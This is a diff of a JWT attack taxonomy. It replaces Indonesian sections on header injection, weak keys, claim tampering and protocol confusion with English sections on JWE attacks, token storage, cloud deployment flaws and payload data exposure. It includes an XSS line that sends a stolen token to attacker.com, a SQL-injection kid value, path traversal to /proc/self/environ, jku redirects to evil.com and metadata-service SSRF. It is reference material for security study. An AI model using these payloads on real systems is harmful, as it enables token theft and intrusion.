+If the verification library reads the first `sub` and the application reads the last `sub`, the attacker achieves claim substitution on a validly-signed token.
 
 ---
 
-## §2. Injeksi Parameter Header
+## §10. JWE (JSON Web Encryption) Specific Attacks
 
-Serangan yang mengeksploitasi parameter header JWT yang mengontrol resolusi kunci. Spesifikasi JWT mendefinisikan beberapa parameter header opsional (`kid`, `jku`, `jwk`, `x5u`, `x5c`, `cty`) yang, jika tidak divalidasi dengan benar, menjadi vektor injeksi.
+JWE adds an encryption layer but introduces new attack surfaces unique to its structure.
 
-### §2-1. Injeksi Key ID (`kid`)
+### §10-1. Sign-Encrypt Confusion (JWS/JWE Inversion)
 
-Parameter `kid` mengidentifikasi kunci mana yang harus digunakan untuk verifikasi. Jika server menggunakan nilai ini dalam kueri database atau operasi filesystem tanpa sanitasi, ia menjadi vektor injeksi.
+When a library exposes a unified `decode()` interface that handles both JWS (signed) and JWE (encrypted) tokens, an attacker can present a JWE where a JWS is expected. The public key used for JWS signature verification is also usable as a JWE encryption key (RSA-OAEP). An attacker who obtains the server's public key can craft a JWE that decrypts successfully — producing an attacker-controlled plaintext — which the library then treats as a verified JWS payload.
 
-| Subtipe | Mekanisme | Kondisi Utama |
-|---|---|---|
-| **SQL injection melalui `kid`** | Nilai `kid` berisi payload SQL (misalnya `' UNION SELECT 'known-secret' --`) yang mengembalikan kunci yang dikontrol penyerang dari database | Server menggunakan `kid` dalam kueri SQL mentah untuk mencari kunci penandatanganan |
-| **Path traversal melalui `kid`** | `kid` mengarah ke file yang dapat diprediksi (misalnya `../../../dev/null` atau `../../../proc/self/environ`) | Server membaca materi kunci dari filesystem menggunakan `kid` sebagai path |
-| **Kunci null melalui `/dev/null`** | Arahkan `kid` ke `/dev/null` (file kosong); tandatangani token dengan string kosong | Sistem Linux/Unix; server membaca path file dari `kid` |
-| **Kunci file yang diketahui** | Arahkan `kid` ke file dengan konten yang diketahui (misalnya `../../../etc/hostname`, file CSS publik) dan gunakan konten tersebut sebagai kunci penandatanganan | File yang dapat diprediksi yang dapat diakses oleh proses server |
-| **LDAP injection melalui `kid`** | Nilai `kid` berisi injeksi filter LDAP | Server me-resolve kunci dari direktori LDAP |
-| **Command injection melalui `kid`** | Nilai `kid` memicu eksekusi perintah OS (misalnya melalui interpolasi backtick) | Server meneruskan `kid` ke perintah shell atau fungsi eval |
+**Presented at Black Hat 2023 ("Three New Attacks Against JSON Web Tokens").**  
+**Condition:** Library does not enforce token type before processing; accepts both JWS and JWE through the same path.
 
-### §2-2. Injeksi JWK Set URL (`jku`)
+### §10-2. CEK Confusion (Content Encryption Key Substitution)
 
-Header `jku` menentukan URL dari mana server mengambil JSON Web Key Set untuk verifikasi.
+In JWE `dir` (direct key agreement) mode, the Content Encryption Key is provided directly rather than being wrapped. If the `enc` algorithm can be switched to a weaker one, or the CEK itself is predictable, the encrypted payload can be decrypted.
 
-| Subtipe | Mekanisme | Kondisi Utama |
-|---|---|---|
-| **URL `jku` tanpa validasi** | Atur `jku` ke server yang dikontrol penyerang yang meng-hosting JWKS yang dibuat; tandatangani dengan kunci privat yang sesuai | Server mengambil JWKS dari URL apa pun yang ditentukan dalam header |
-| **Bypass daftar izin URL** | Gunakan open redirect, DNS rebinding, atau diferensial parser URL untuk melewati daftar izin domain (misalnya `https://trusted.com@evil.com`, `https://trusted.com#@evil.com/jwks`) | Server memvalidasi domain `jku` tetapi rentan terhadap trik parsing URL |
-| **Penyalahgunaan `jku` same-origin** | Simpan JWKS yang dibuat di path yang dapat dikontrol pengguna dalam domain tepercaya (misalnya upload file, halaman profil, endpoint API yang mencerminkan JSON) | Server membatasi `jku` ke same-origin tetapi konten pengguna dapat di-hosting pada domain yang sama |
-| **SSRF melalui `jku`** | Arahkan `jku` ke layanan internal (`http://169.254.169.254/...`) untuk memicu permintaan sisi server | Server mengikuti `jku` tanpa membatasi ke host eksternal |
+### §10-3. JWE Compact vs. JSON Serialization Confusion
 
-### §2-3. Injeksi JWK Tertanam (`jwk`)
-
-Header `jwk` menyematkan kunci publik langsung di dalam token.
-
-| Subtipe | Mekanisme | Kondisi Utama |
-|---|---|---|
-| **Token self-signed** | Hasilkan pasangan kunci RSA/EC milik penyerang; sematkan kunci publik di header `jwk`; tandatangani dengan kunci privat | Server menggunakan `jwk` tertanam untuk verifikasi tanpa memeriksa terhadap key store tepercaya |
-| **Pencocokan Key ID** | Atur `kid` dalam `jwk` tertanam agar cocok dengan `kid` yang diketahui di key store tepercaya server, tetapi sediakan materi kunci yang berbeda | Server mencocokkan `kid` tetapi tidak memverifikasi apakah materi kunci cocok dengan kunci tepercaya (CVE-2025-24976) |
-
-### §2-4. Injeksi Parameter Sertifikat X.509 (`x5u`, `x5c`)
-
-| Subtipe | Mekanisme | Kondisi Utama |
-|---|---|---|
-| **URL `x5u` tanpa validasi** | Atur `x5u` ke URL yang dikontrol penyerang yang menyajikan sertifikat X.509 yang dibuat | Server mengambil sertifikat dari URL mana pun |
-| **Rantai `x5c` self-signed** | Sematkan rantai sertifikat self-signed dalam header `x5c` | Server tidak memvalidasi rantai sertifikat terhadap CA tepercaya |
-| **Kebingungan rantai sertifikat** | Berikan sertifikat leaf yang valid yang ditandatangani oleh root yang tidak tepercaya, berharap server hanya memvalidasi leaf | Logika validasi rantai yang tidak lengkap |
-
-### §2-5. Manipulasi Content Type (`cty`)
-
-| Subtipe | Mekanisme | Kondisi Utama |
-|---|---|---|
-| **Kebingungan nested JWT** | Atur `cty` ke `"JWT"` untuk memicu pemrosesan token bersarang pada token yang tidak bersarang | Server mengikuti `cty` secara buta, memungkinkan double-decoding atau perubahan pemrosesan |
-| **Deserialisasi melalui `cty`** | Atur `cty` ke `"application/x-java-serialized-object"` atau `"text/xml"` untuk memicu deserialisasi tidak aman atau pemrosesan XXE pada payload | Server menggunakan `cty` untuk menentukan strategi deserialisasi payload |
+JWE supports both compact (`header.key.iv.ciphertext.tag`) and JSON serialization (`{"protected":..., "recipients":...}`). Libraries that parse both formats may behave differently — particularly around which header is treated as authoritative — allowing parameter injection through one serialization while verification happens against the other.
 
 ---
 
-## §3. Kelemahan Implementasi Kriptografis
+## §11. Token Transport and Storage Attacks
 
-Serangan yang menargetkan kelemahan dalam algoritma kriptografis atau implementasinya, terlepas dari manipulasi header.
+### §11-1. localStorage XSS Theft
 
-### §3-1. Eksploitasi Kunci Simetris Lemah
+Tokens stored in `localStorage` or `sessionStorage` are accessible to any JavaScript running on the page origin. A single XSS vulnerability — including via a third-party script dependency — allows complete token exfiltration.
 
-| Subtipe | Mekanisme | Kondisi Utama |
-|---|---|---|
-| **Brute force berbasis kamus** | Gunakan hashcat (`-m 16500`) atau jwt_tool dengan wordlist yang diketahui (misalnya `jwt.secrets.list`) untuk memecahkan secret HMAC secara offline | Secret HMAC adalah string yang pendek, mudah ditebak, atau umum |
-| **Secret default/hardcoded** | Gunakan secret default yang diketahui (`"secret"`, `"password"`, `"changeme"`, `"your-256-bit-secret"`) | Developer meninggalkan secret placeholder di produksi |
-| **Cracking berbasis aturan** | Terapkan aturan hashcat (misalnya `best64.rule`) untuk memutasikan entri wordlist dan menemukan secret yang diturunkan dari kata sandi | Secret diturunkan dari kata sandi yang dipilih manusia |
-| **Brute force (kunci pendek)** | Brute force karakter demi karakter untuk kunci yang lebih pendek dari 256 bit yang direkomendasikan | Panjang kunci jauh di bawah persyaratan MUST dari RFC 7518 |
+**Payload:** `new Image().src = 'https://attacker.com/steal?t=' + localStorage.getItem('jwt');`
 
-Lebih dari 340 secret JWT lemah yang diketahui telah dikatalogkan. Serangan ini sepenuhnya offline — tidak diperlukan interaksi server setelah mendapatkan satu token yang valid.
+**Impact duration:** Stolen token remains valid until expiry; attacker retains access even after XSS is patched and the victim logs out (unless revocation is implemented; see §7-1).
 
-### §3-2. Kelemahan Implementasi Elliptic Curve
+### §11-2. Cookie-Stored JWT Attacks
 
-| Subtipe | Mekanisme | Kondisi Utama |
-|---|---|---|
-| **Psychic Signatures (nilai r,s nol)** | Kirimkan signature ECDSA di mana `r` dan `s` keduanya nol (atau nilai degenerat tertentu); persamaan verifikasi `0 = 0` menjadi trivially true | Java 15–18 dengan provider JCA bawaan (CVE-2022-21449) |
-| **Penggunaan ulang nonce ECDSA** | Jika server menandatangani dua token berbeda dengan nonce ECDSA yang sama (`k`), kunci privat dapat dipulihkan secara matematis | Implementasi ECDSA sisi server dengan RNG yang rusak atau kegagalan nonce deterministik |
-| **Serangan kurva tidak valid** | Sediakan titik kunci publik pada kurva yang berbeda (lebih lemah); server melakukan operasi pada kurva yang lemah, memungkinkan pemulihan kunci | Library tidak memvalidasi bahwa titik kunci publik berada pada kurva yang diharapkan |
-| **Injeksi titik degenerat** | Gunakan titik kurva berorde kecil untuk membocorkan bit kunci privat melalui beberapa interaksi | Library tidak memeriksa orde titik |
+| Subtype | Mechanism | Condition |
+|---------|-----------|-----------|
+| **HttpOnly-absent cookie** | JWT in cookie without HttpOnly flag; JavaScript can read it | Cookie set without HttpOnly |
+| **Secure-flag absent** | Token transmitted over HTTP; intercepted by network attacker | Mixed-content or plain-HTTP page |
+| **SameSite-absent CSRF** | JWT in cookie with `SameSite=None`; CSRF request automatically includes cookie | No CSRF token for state-changing endpoints |
+| **Cookie scope too broad** | Domain set to `.example.com`; token valid on all subdomains; XSS on any subdomain steals it | Overly broad cookie domain |
 
-### §3-3. Kelemahan Implementasi RSA
+### §11-3. URL-Embedded Token Exposure
 
-| Subtipe | Mekanisme | Kondisi Utama |
-|---|---|---|
-| **Kunci RSA pendek** | Faktorkan modulus RSA ketika kunci yang lemah/pendek (< 2048 bit) digunakan | Server menggunakan kunci RSA berukuran kecil |
-| **Bleichenbacher padding oracle** | Eksploitasi perbedaan validasi padding PKCS#1 v1.5 dalam dekripsi RSA (relevan untuk JWE) | Server menggunakan RSA dengan PKCS#1 v1.5 dan membocorkan validitas padding |
-| **e=1 atau eksponen degenerat** | Gunakan kunci RSA dengan eksponen publik `e=1`, membuat pesan apa pun menjadi signature-nya sendiri | Library tidak memvalidasi parameter kunci RSA |
+When JWTs are passed in URL parameters (e.g., `?token=eyJ...`), they appear in:
+- Browser history
+- Server access logs
+- Referrer headers sent to third parties
+- Shared or bookmarked URLs
 
-### §3-4. Penyalahgunaan Derivasi Kunci PBES2 (Serangan Billion Hashes)
+**Condition:** Application places JWT in URL path or query string rather than Authorization header.
 
-JWE mendukung enkripsi berbasis kata sandi melalui PBES2 (RFC 7518 §4.8), di mana Content Encryption Key (CEK) diturunkan dari kata sandi menggunakan iterasi PBKDF2. Jumlah iterasi ditentukan dalam parameter header `p2c` (PBES2 Count) — yang dikontrol penyerang dan diproses *sebelum* pemeriksaan autentikasi atau validitas apa pun.
+### §11-4. Man-in-the-Middle Token Interception
 
-| Subtipe | Mekanisme | Kondisi Utama |
-|---|---|---|
-| **Jumlah iterasi berlebihan** | Atur `p2c` ke nilai integer 32-bit maksimum (2.147.483.647); server harus menyelesaikan semua iterasi PBKDF2 untuk menurunkan CEK sebelum dapat menentukan apakah token valid. Satu token berbahaya dapat menghabiskan waktu CPU selama menit hingga jam. Serangan ini sepenuhnya tanpa autentikasi — tidak diperlukan kredensial valid atau token sebelumnya. | Library mendukung algoritma enkripsi kunci PBES2 (`PBES2-HS256+A128KW`, `PBES2-HS384+A192KW`, `PBES2-HS512+A256KW`) dan tidak menegakkan nilai `p2c` maksimum (CVE-2023-51775, CVE-2023-49290) |
-| **DoS batch yang diperkuat** | Kirim beberapa token JWE dengan nilai `p2c` tinggi secara paralel, mengalikan kelelahan CPU di seluruh thread/proses worker | Server memproses token JWE dari sumber tanpa autentikasi; tidak ada pembatasan laju pada validasi token |
-
-**Library yang terpengaruh dan perbaikannya:**
-- **jose4j** (Java): rentan sebelum 0.9.4 (CVE-2023-51775)
-- **go-jose** (Go): diperbaiki di v3.0.2 (CVE-2023-49290)
-- **jose2go** (Go): diperbaiki di v1.6.0
-- **josekit-rs** (Rust): diperbaiki di v0.8.5
+| Subtype | Mechanism |
+|---------|-----------|
+| **HTTP token transmission** | JWT sent over plain HTTP; any network observer captures and replays it |
+| **TLS downgrade (HSTS bypass)** | SSLStrip or similar; forces HTTP where token is exposed |
+| **Certificate pinning bypass** | Mobile apps without pinning allow mitmproxy interception |
 
 ---
 
-## §4. Manipulasi Claim Payload
+## §12. Architecture and Deployment-Level Attacks
 
-Serangan yang memodifikasi claim payload JWT untuk mengubah keputusan otorisasi, meningkatkan hak istimewa, atau melewati logika validasi. Ini memerlukan bypass signature (§1–§3) atau mengeksploitasi aplikasi yang memeriksa claim sebelum atau tanpa verifikasi signature penuh.
+These attacks exploit the gap between the JWT specification and real-world multi-component deployment architectures.
 
-### §4-1. Manipulasi Identity Claim
+### §12-1. Cross-Service Token Relay (Microservice Audience Bypass)
 
-| Subtipe | Mekanisme | Kondisi Utama |
-|---|---|---|
-| **Penggantian `sub` (Subject)** | Ubah claim `sub` ke pengidentifikasi pengguna lain | Aplikasi menggunakan `sub` untuk otorisasi tanpa verifikasi tambahan |
-| **Penggantian claim `email`** | Ubah claim `email` ke email pengguna yang ditarget | Aplikasi mempercayai claim email untuk pencarian identitas pengguna |
-| **Substitusi ID numerik** | Ubah ID pengguna numerik dalam claim (misalnya `user_id`, `uid`) untuk menargetkan pengguna lain | BOLA/IDOR melalui claim JWT |
-| **Kebingungan issuer (`iss`)** | Ubah `iss` ke issuer tepercaya berbeda yang juga diterima aplikasi | Lingkungan multi-IdP di mana issuer berbagi kunci penandatanganan atau validasi longgar |
-| **Injeksi array dalam `iss`** | Berikan `iss` sebagai array yang berisi nilai legitimate dan berbahaya (CVE-2025-30144) | Library secara salah menerima array untuk claim bertipe string |
+In microservice architectures, a single identity service may issue JWTs consumed by multiple downstream services. If those services do not validate the `aud` (audience) claim, a token issued for a low-privilege service (e.g., read-only API) can be replayed against a high-privilege service (e.g., admin API).
 
-### §4-2. Manipulasi Authorization Claim
+**Real-World Case (HackerOne #1889161, Argo CD, Critical):** Versions starting with v1.8.2 accepted OIDC tokens without validating the `aud` claim, allowing tokens issued for unrelated services to authenticate to the Argo CD API.
 
-| Subtipe | Mekanisme | Kondisi Utama |
-|---|---|---|
-| **Eskalasi role** | Ubah `role` dari `"user"` ke `"admin"` atau injeksikan `["admin", "user"]` | Aplikasi mengandalkan claim JWT untuk role-based access control |
-| **Perluasan scope** | Tambahkan scope OAuth tambahan (misalnya `"read write admin"`) ke claim `scope` | API gateway mempercayai scope JWT tanpa merujuk silang ke server otorisasi |
-| **Injeksi permission** | Tambahkan claim permission baru atau modifikasi flag boolean yang ada (misalnya `"is_admin": true`) | Aplikasi menggunakan claim JWT kustom untuk otorisasi yang lebih granular |
-| **Manipulasi tenant ID** | Ubah `tenant_id` atau `org_id` untuk mengakses sumber daya tenant lain | Aplikasi multi-tenant dengan isolasi tenant berdasarkan claim JWT |
+### §12-2. Cloud Load Balancer Issuer Forgery (ALBeast)
 
-### §4-3. Manipulasi Temporal Claim
+AWS Application Load Balancer uses a shared regional public key server (`public-keys.auth.elb.<region>.amazonaws.com`) for all customer ALBs. An attacker creates their own ALB, configures it with the victim's expected issuer, and mints JWTs using the shared infrastructure. Applications that validate the signature but not the `signer` field (ALB ARN) in the JWT header accept these forged tokens.
 
-| Subtipe | Mekanisme | Kondisi Utama |
-|---|---|---|
-| **Penghapusan expiration** | Hapus claim `exp` sepenuhnya, membuat token yang tidak pernah kedaluwarsa | Server tidak menegakkan keberadaan `exp` yang wajib |
-| **Perpanjangan expiration** | Atur `exp` ke timestamp jauh di masa depan | Bypass signature tersedia; server mempercayai `exp` dalam token |
-| **Bypass `nbf` (Not Before)** | Atur `nbf` ke waktu lampau atau manipulasi waktu sisi klien yang digunakan untuk pembuatan `nbf` | Aplikasi mengandalkan waktu yang disediakan klien untuk `nbf` |
-| **Manipulasi `iat` (Issued At)** | Mundurkan atau majukan claim `iat` untuk mengelabui pemeriksaan berbasis usia | Server menggunakan `iat` untuk validasi kesegaran token |
+**CVE-2024-8901 / CVE-2024-10125 (AWS, August 2024):** 15,000+ applications identified as potentially vulnerable. Patch requires: (1) validating `signer` header equals expected ALB ARN, and (2) restricting traffic source to ALB security group.
 
-### §4-4. Manipulasi Audience Claim
+### §12-3. OAuth/OIDC JWT Claim Substitution
 
-| Subtipe | Mekanisme | Kondisi Utama |
-|---|---|---|
-| **Bypass audience (validasi hilang)** | Token tidak memiliki claim `aud` atau server tidak memvalidasinya, memungkinkan penggunaan token lintas-layanan | Validasi audience tidak diterapkan |
-| **Kebingungan audience** | Gunakan token yang diterbitkan untuk Layanan A pada Layanan B ketika keduanya menerima issuer yang sama | Layanan berbagi kepercayaan tetapi tidak memvalidasi `aud` secara berbeda (CVE-2024-5798) |
-| **Serangan ALBEAST** | Konfigurasikan token untuk tenant AWS milik penyerang sendiri dengan claim audience yang diterima oleh aplikasi korban | Lingkungan multi-tenant AWS tanpa validasi `aud`+penanda yang ketat |
+When applications accept OIDC identity tokens and map identity based on a mutable claim rather than an immutable identifier:
 
----
+| Subtype | Mechanism | Bounty |
+|---------|-----------|--------|
+| **nOAuth email claim attack** | Azure AD allows users to modify their email address in Contact Information; this email flows into the `email` claim of the issued JWT; attacker sets their email to victim's address and authenticates as victim | $75,000 total (donated by Descope, 2023) |
+| **Social login email reuse** | Application does not verify email uniqueness across providers; attacker creates account with victim's email via different IdP | Common in multi-IdP setups |
+| **Cross-tenant sub spoofing** | `sub` claim is unique per-tenant in some IdPs; same `sub` value reused across tenants by attacker | SaaS platforms with shared IdP |
 
-## §5. Serangan Infrastruktur Manajemen Kunci
+### §12-4. Multi-Endpoint Inconsistency
 
-Serangan yang menargetkan infrastruktur yang menyimpan, mendistribusikan, dan merotasi kunci penandatanganan, bukan token itu sendiri.
+In large applications, different microservices may use different JWT libraries, keys, or validation configurations. A JWT configuration that is secure at the primary endpoint may be entirely absent or misconfigured at:
+- Legacy API versions (`/api/v1/` vs. `/api/v2/`)
+- Internal or partner API routes
+- Admin or debug endpoints
+- WebSocket upgrade endpoints
 
-### §5-1. Eksploitasi Endpoint JWKS
+**Testing approach:** Obtain a valid token from the primary endpoint; attempt to use it unmodified (or modified) across all discovered endpoints.
 
-| Subtipe | Mekanisme | Kondisi Utama |
-|---|---|---|
-| **Pengambilalihan endpoint JWKS** | Dapatkan kendali atas domain atau path yang meng-hosting endpoint JWKS (misalnya domain kedaluwarsa, DNS menggantung) | URL JWKS mengarah ke domain yang dapat didaftarkan atau dikendalikan penyerang |
-| **Keracunan JWKS** | Suntikkan kunci publik penyerang ke endpoint JWKS melalui kerentanan aplikasi | Akses tulis ke endpoint JWKS atau backing store-nya |
-| **Eksploitasi caching JWKS** | Eksploitasi jendela cache TTL — ganti kunci selama jendela saat server masih mempercayai kunci yang di-cache | Server meng-cache respons JWKS; penyerang dapat memodifikasi endpoint antara pembaruan cache |
-| **Manipulasi OIDC discovery** | Modifikasi `.well-known/openid-configuration` untuk mengarah ke endpoint JWKS yang berbeda | Penyerang mengendalikan endpoint OIDC discovery atau dapat mencegat/memodifikasinya |
+### §12-5. IoT / Constrained-Device JWT Abuse
 
-### §5-2. Kegagalan Rotasi Kunci
-
-| Subtipe | Mekanisme | Kondisi Utama |
-|---|---|---|
-| **Penerimaan kunci lama** | Eksploitasi server yang terus menerima token yang ditandatangani dengan kunci yang dicabut/dirotasi tanpa batas waktu | Tidak ada penegakan kedaluwarsa kunci |
-| **Key rollback** | Tipu server agar kembali ke kunci yang lebih lama (berpotensi dikompromikan) | Pemilihan kunci berdasarkan `kid` tanpa memvalidasi kesegaran kunci |
-| **Kebingungan kunci paralel** | Selama rotasi, eksploitasi jendela saat kunci lama dan baru sama-sama valid untuk melewati kontrol yang mengasumsikan operasi kunci tunggal | Logika aplikasi mengasumsikan satu kunci aktif |
-
-### §5-3. Paparan Materi Kunci
-
-| Subtipe | Mekanisme | Kondisi Utama |
-|---|---|---|
-| **Kunci dalam source code** | Ekstrak secret HMAC dari repositori publik, image Docker, atau JavaScript sisi klien | Developer meng-commit secret ke version control |
-| **Kunci dalam konfigurasi** | Ekstrak kunci dari cloud storage yang salah dikonfigurasi (S3 bucket), dump variabel lingkungan, atau pesan error | Praktik deployment yang tidak aman |
-| **Kunci melalui side-channel** | Pulihkan materi kunci melalui timing attack pada perbandingan HMAC atau analisis daya pada perangkat tertanam | Fungsi perbandingan yang tidak dilindungi atau akses fisik |
+| Subtype | Mechanism |
+|---------|-----------|
+| **Supply-chain pre-signed tokens** | Attacker with physical access during manufacturing manipulates device clock; coerces Secure Element to sign tokens with `iat` in far future; device later accepts these tokens indefinitely ("Back to the Future", LightSEC 2025) |
+| **No nonce in token binding** | RFC 7519 does not mandate nonces; IoT devices with long-lived sessions cannot distinguish replay from fresh authentication |
+| **Clock skew exploitation** | IoT devices without reliable time source accept tokens with wide `nbf`/`exp` windows; captured tokens replayed during the window |
 
 ---
 
-## §6. Serangan Transport dan Penyimpanan Token
+## §13. Sensitive Data Exposure via Payload
 
-Serangan yang menargetkan cara JWT ditransmisikan, disimpan, dan dikelola dalam saluran komunikasi klien-server.
+The JWT payload is Base64URL-encoded, not encrypted. Any entity with the token can decode and read all claims.
 
-### §6-1. Vektor Kebocoran Token
+### §13-1. Sensitive Claims in Unencrypted Payloads
 
-| Subtipe | Mekanisme | Kondisi Utama |
-|---|---|---|
-| **Kebocoran parameter URL** | JWT diteruskan sebagai parameter query URL, tercatat dalam log server, riwayat browser, dan header Referer | Aplikasi menggunakan JWT dalam URL daripada header Authorization |
-| **Kebocoran header Referer** | Token dalam URL bocor ke domain pihak ketiga melalui header HTTP Referer | Sumber daya eksternal dimuat di halaman yang menerima token |
-| **Paparan log server** | JWT dicatat dalam access log, error log, atau output debug dalam plaintext | Konfigurasi logging yang verbose |
-| **Kebocoran lintas-origin** | Token dapat diakses oleh skrip pihak ketiga melalui DOM (localStorage/sessionStorage) | Kerentanan XSS + penyimpanan token sisi klien |
-| **Pencatatan proxy/CDN** | Proxy atau CDN perantara mencatat header Authorization yang berisi JWT | Miskonfigurasi proxy/CDN |
+| Risk | Common Claims |
+|------|--------------|
+| **PII exposure** | `email`, `phone`, `address`, `date_of_birth` in JWT payload readable by any token holder |
+| **Internal identifiers** | Database UUIDs, internal user IDs, department codes |
+| **Access control metadata** | `clearance_level`, `can_read_phi`, `is_internal` — reveals authorization model |
+| **System topology** | `tenant_db_host`, `shard_id`, `region` — leaks infrastructure details |
 
-### §6-2. Eksploitasi Penyimpanan Sisi Klien
+**Condition:** Token passed through browser history, logs, Referrer headers, or browser plugins; any of these expose the decoded payload.
 
-| Subtipe | Mekanisme | Kondisi Utama |
-|---|---|---|
-| **XSS + pencurian localStorage** | Injeksi JavaScript membaca JWT dari `localStorage` atau `sessionStorage` | Token disimpan dalam penyimpanan browser; kerentanan XSS ada |
-| **XSS + pencurian cookie** | Curi JWT dari cookie tanpa flag `HttpOnly` | Cookie tidak memiliki `HttpOnly`; kerentanan XSS ada |
-| **CSRF dengan JWT berbasis cookie** | Jika JWT ada dalam cookie tanpa perlindungan CSRF, picu permintaan terautentikasi dari browser korban | JWT disimpan dalam cookie; tidak ada CSRF token; `SameSite` tidak diatur |
+### §13-2. JWT in Logs and Telemetry
 
-### §6-3. Token Replay
-
-| Subtipe | Mekanisme | Kondisi Utama |
-|---|---|---|
-| **Replay sederhana** | Cegat dan gunakan kembali JWT yang valid sebelum kedaluwarsa | Tidak ada perlindungan replay; token dicegat melalui MITM, log, atau kebocoran |
-| **Replay lintas-konteks** | Gunakan token yang diperoleh dari satu konteks (misalnya email reset kata sandi) dalam konteks lain (misalnya autentikasi API) | Token tidak terikat ke tindakan atau konteks tertentu |
-| **Penyalahgunaan token berumur panjang** | Eksploitasi token dengan kedaluwarsa yang sangat panjang (jam/hari) setelah pengguna telah logout | Tidak ada mekanisme pencabutan sisi server; jendela `exp` yang panjang |
+| Leakage Surface | Mechanism |
+|----------------|-----------|
+| **Access logs** | Token in Authorization header or URL parameter logged by web server |
+| **APM traces** | Distributed tracing tools capture request headers including Authorization |
+| **Error reporting** | Sentry, Datadog errors include full request context with token |
+| **CDN / load balancer logs** | Third-party infrastructure retains tokens |
 
 ---
 
-## §7. Serangan Tingkat Protokol dan Struktural
+## Attack Scenario Mapping (Axis 3)
 
-Serangan yang mengeksploitasi properti fundamental dari spesifikasi JWT/JOSE atau interaksinya dengan protokol yang lebih luas.
-
-### §7-1. Kebingungan JWS/JWE
-
-JWS (ditandatangani) dan JWE (dienkripsi) berbagi format serialisasi kompak yang sama — segmen Base64URL yang dipisahkan titik — dan RFC 7519 secara eksplisit mengizinkan JWT untuk ditandatangani atau dienkripsi. Library yang menyediakan antarmuka `decode()` terpadu yang menangani kedua format tanpa menegakkan jenis mana yang diharapkan menciptakan permukaan serangan yang kaya di mana batas antara operasi penandatanganan dan enkripsi runtuh.
-
-| Subtipe | Mekanisme | Kondisi Utama |
-|---|---|---|
-| **Kebingungan sign/encrypt (pemalsuan kunci publik)** | Penyerang memperoleh kunci publik RSA/EC (misalnya melalui OIDC `/.well-known/jwks.json`), lalu membuat token JWE yang dienkripsi dengan kunci publik tersebut. Ketika `decode()` terpadu server memproses JWE ini, ia mendekripsi menggunakan kunci privatnya dan menerima payload yang dikontrol penyerang sebagai JWT yang valid — penyerang menetapkan claim sembarang tanpa memerlukan kunci privat penandatanganan. Serangan ini secara fundamental menumbangkan model keamanan: verifikasi JWS membuktikan keaslian (hanya pemegang kunci privat yang dapat menandatangani), tetapi dekripsi JWE hanya membuktikan kerahasiaan (siapa pun dengan kunci publik dapat mengenkripsi). Dengan mengirimkan JWE di mana JWS diharapkan, penyerang mengubah pemeriksaan "bukti identitas" menjadi pemeriksaan "bisakah kamu membaca ini?" — yang bisa dilakukan siapa pun dengan kunci publik. | Library menerima JWS dan JWE melalui jalur decode tunggal; aplikasi menggunakan penandatanganan asimetris (RS*/PS*/ES*); penyerang dapat memperoleh kunci publik; tidak ada penegakan jenis token eksplisit (JWS vs. JWE) (CVE-2022-39174, CVE-2022-3102, CVE-2023-51774) |
-| **Token polyglot** | Satu token dibuat agar valid di bawah beberapa interpretasi parsing di berbagai library JWT. Karena JWS (3 segmen yang dipisahkan titik) dan JWE (5 segmen yang dipisahkan titik) berbagi serialisasi kompak yang serupa, dan library berbeda dalam cara mereka mendeteksi dan merutekan jenis token, token yang dibuat dengan cermat dapat menyebabkan satu library memvalidasinya sebagai JWS yang sah sementara library lain memprosesnya sebagai JWE — memungkinkan pemalsuan token lengkap dalam arsitektur multi-library (misalnya gateway memvalidasi JWS, backend memproses JWE). Payload JWE, kunci terenkripsi, IV, dan kolom authentication tag dapat diatur ke urutan byte sembarang dengan panjang yang sesuai, memberikan penyerang kebebasan untuk membuat token yang ambigu tersebut. | Arsitektur multi-komponen yang menggunakan library JWT berbeda untuk validasi vs. konsumsi; library mendeteksi jenis token secara otomatis dari struktur daripada menegakkannya secara eksplisit |
-| **Kebingungan jenis encrypted↔signed** | Kirimkan token JWS di mana server mengharapkan JWE, atau sebaliknya, mengeksploitasi jalur parsing dan logika validasi berbeda yang diterapkan pada setiap jenis | Server tidak menegakkan jenis token yang diharapkan melalui pemeriksaan jenis eksplisit atau validasi header `typ` |
-| **Penyalahgunaan nested JWT** | Eksploitasi double-encoding atau double-processing ketika server menangani nested JWT (JWS di dalam JWE) | Server memproses token bersarang tanpa pemeriksaan kedalaman/jenis yang tepat |
-
-### §7-2. Eksploitasi Encoding Base64
-
-| Subtipe | Mekanisme | Kondisi Utama |
-|---|---|---|
-| **Base64URL non-kanonik** | Gunakan representasi Base64 alternatif (padding berbeda, whitespace, jeda baris) yang mendekode ke nilai yang sama tetapi melewati pemeriksaan signature atau aturan WAF | Parser dan verifier menangani Base64 secara berbeda |
-| **Injeksi Unicode/encoding** | Suntikkan karakter Unicode atau encoding alternatif dalam nilai claim yang dinormalisasi berbeda di seluruh komponen | Arsitektur multi-komponen dengan parser JSON/string yang berbeda |
-
-### §7-3. Serangan Diferensial Parser
-
-| Subtipe | Mekanisme | Kondisi Utama |
-|---|---|---|
-| **Diferensial parser JSON** | Eksploitasi perbedaan antara parser JSON (kunci duplikat, koma akhir, komentar, presisi angka) di seluruh komponen yang memproses JWT yang sama | Library parsing JSON yang berbeda antara penerbit token, gateway, dan aplikasi |
-| **Penanganan claim duplikat** | Sertakan claim yang sama dua kali dengan nilai berbeda; parser berbeda mengambil kemunculan pertama vs. terakhir | Ketidakkonsistenan parser antara lapisan validasi dan konsumsi |
-| **Kelelahan memori melalui token yang cacat** | Kirim token dengan jumlah pemisah titik yang berlebihan, JSON yang sangat bersarang, atau segmen Base64 yang sangat panjang (CVE-2025-27144) | Library mengalokasikan memori sebanding dengan input tanpa pemeriksaan batas |
-
-### §7-4. Eksploitasi Statelessness
-
-| Subtipe | Mekanisme | Kondisi Utama |
-|---|---|---|
-| **Token yang tidak dapat dicabut** | Eksploitasi ketidakmampuan fundamental untuk mencabut JWT stateless sebelum kedaluwarsa alaminya | Tidak ada daftar hitam token atau daftar pencabutan sisi server |
-| **Session fixation melalui JWT** | Perbaiki sesi korban dengan menyuntikkan JWT yang diketahui, mempertahankan akses bahkan setelah tindakan korban | Aplikasi tidak mengikat JWT ke status sesi tambahan |
-| **Ketiadaan keunikan `jti`** | Putar ulang token ketika claim `jti` (JWT ID) tidak ada atau server tidak melacak nilai `jti` yang telah digunakan | Tidak ada penegakan `jti`; tidak ada pelacakan sisi server |
+| Scenario | Architecture | Primary Categories | Example Impact |
+|----------|-------------|-------------------|----------------|
+| **Authentication Bypass** | Any | §1, §4, §5, §10 | Full admin access without credentials |
+| **Privilege Escalation** | Any | §3-1, §3-2, §3-4 | Low-priv user gains admin role |
